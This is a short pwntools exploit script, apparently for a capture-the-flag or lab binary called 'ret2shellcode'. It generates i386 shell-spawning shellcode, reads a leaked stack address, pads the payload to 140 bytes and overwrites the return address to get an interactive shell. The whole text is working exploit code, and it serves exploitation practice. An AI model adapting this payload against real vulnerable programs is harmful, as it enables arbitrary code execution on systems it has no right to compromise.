from pwn import *

context.arch = 'i386' # CPU
context.log_level = 'debug' # to display more information

io = process('./ret2shellcode')

sh = asm(shellcraft.sh()) # to generate a shellcode for shell and to transfer shellcode into machine code
stack = eval(io.recv(10)) # to receive 10B and to transfer it into a number
payload = sh.ljust(140, b'a') + p32(stack) # padding shellcode with 'a' to 140B, to transfer a 32bit number into a 4B little-endian string

gdb.attach(io) # to debug with gdb-peda/pwndbg, break point: read
io.send(payload)

io.interactive() 